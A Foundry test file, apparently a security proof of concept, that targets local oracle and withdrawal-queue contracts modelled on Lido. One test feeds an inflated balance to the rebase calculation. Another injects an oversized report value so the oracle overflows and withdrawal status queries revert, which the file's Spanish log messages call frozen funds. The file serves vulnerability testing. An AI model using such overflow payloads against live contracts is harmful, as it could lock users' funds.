// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Lido_Core/LidoOracle.sol";
import "../src/Lido_Core/WithdrawalQueue.sol";

contract LidoAttackTest is Test {
    LidoOracle oracle;
    WithdrawalQueue queue;

    function setUp() public {
        oracle = new LidoOracle();
        queue = new WithdrawalQueue(address(oracle));
    }

    function testExploitRebase() public {
        uint256 balanceInicial = 100 ether;
        uint256 balanceInflado = 150 ether; 

        uint256 rebase = oracle.calculateRebase(balanceInflado, balanceInicial);
        emit log_named_uint("Multiplicador de Rebase detectado", rebase);

        if (rebase > 10500) {
            emit log("ALERTA: Vector de inflacion detectado");
        }
    }

    function testWithdrawalFreeze() public {
        // 1. Inyectamos el numero gigante que causa Overflow (Panic 0x11)
        uint256 balanceGigante = 95766262441414123463108253033211924168360153421382992350105833566050353633896;
        oracle.pushReport(1, balanceGigante, 1000);

        // 2. Intentamos consultar el estado de retiro. 
        // El oráculo hará (balanceGigante * 10000) y explotará antes de responder.
        vm.expectRevert(); 
        queue.getWithdrawalStatus(1, 10 ether);
        
        emit log("CONFIRMADO: Fondos bloqueados por fallo en cascada del Oraculo.");
    }
}
